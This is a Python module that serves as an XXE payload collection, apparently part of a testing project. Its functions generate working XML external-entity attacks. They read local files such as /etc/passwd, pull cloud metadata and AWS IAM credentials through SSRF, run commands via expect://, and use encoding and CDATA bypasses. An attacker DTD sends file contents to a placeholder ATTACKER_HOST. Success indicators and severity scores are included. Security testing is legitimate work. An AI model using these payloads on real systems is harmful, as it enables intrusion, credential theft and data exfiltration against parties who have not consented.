"""
xxe_payloads.py — XXE payload database (Project #43)
All payloads are for LEGAL testing only.
"""

def basic_payload(entity_target="file:///etc/passwd"):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "{entity_target}">]>
<root>&xxe;</root>'''

def error_based_payload(bad_file="file:///etc/hostname"):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "{bad_file}">
  <!ENTITY % eval "<!ENTITY &#37; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root/>'''

def blind_oob_payload(attacker_dtd_url, file_path="file:///etc/passwd"):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "{file_path}">
  <!ENTITY % dtd SYSTEM "{attacker_dtd_url}">
  %dtd;
]>
<root/>'''

def ssrf_payload(target_url):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "{target_url}">]>
<root>&xxe;</root>'''

def rce_expect_payload(command="id"):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://{command}">]>
<root>&xxe;</root>'''

def rce_php_filter_payload(file_path="/etc/passwd"):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">]>
<root>&xxe;</root>'''

def utf16_payload(entity_target="file:///etc/passwd"):
    raw = basic_payload(entity_target)
    return b'\xff\xfe' + raw.encode('utf-16-le')

def utf16_be_payload(entity_target="file:///etc/passwd"):
    raw = basic_payload(entity_target)
    return b'\xfe\xff' + raw.encode('utf-16-be')

def comment_bypass_payload(entity_target="file:///etc/passwd"):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!-- c1 -->
  <!ENTITY xxe SYSTEM "{entity_target}">
  <!-- c2 -->
]>
<root>&xxe;</root>'''

def cdata_bypass_payload(entity_target="file:///etc/passwd"):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "{entity_target}">]>
<root><![CDATA[&xxe;]]></root>'''

def svg_xxe_payload(entity_target="file:///etc/passwd"):
    return f'''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "{entity_target}">]>
<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>'''

def soap_xxe_payload(entity_target="file:///etc/passwd"):
    return f'''<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "{entity_target}">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <soap:GetData>&xxe;</soap:GetData>
  </soap:Body>
</soap:Envelope>'''

LINUX_FILES = [
    "/etc/passwd",
    "/etc/hostname",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
]

WINDOWS_FILES = [
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

SSRF_TARGETS = {
    "aws_metadata": "http://169.254.169.254/latest/meta-data/",
    "aws_iam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "gcp": "http://metadata.google.internal/computeMetadata/v1/",
    "localhost_app": "http://127.0.0.1:5000/",
}

INDICATORS = {
    "file_content": ["root:x:", "daemon:x:", "bin:x:", "nobody:x:"],
    "error_based":  ["XML", "DOCTYPE", "ENTITY", "SYSTEM", "Syntax"],
    "ssrf_success": ["ami-id", "instance-id", "metadata", "XXE Test Target"],
    "rce_success":  ["uid=", "gid=", "groups=", "www-data"],
}

ATTACKER_DTD = '''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'http://ATTACKER_HOST:ATTACKER_PORT/?data=%file;'>">
%eval;
%exfil;
'''

def score(issue_type):
    scores = {
        "xxe_detected":       "INFO",
        "file_disclosure":    "HIGH",
        "ssrf_via_xxe":       "HIGH",
        "blind_oob":          "HIGH",
        "rce_via_xxe":        "CRITICAL",
        "cloud_metadata":     "CRITICAL",
    }
    return scores.get(issue_type, "MEDIUM")
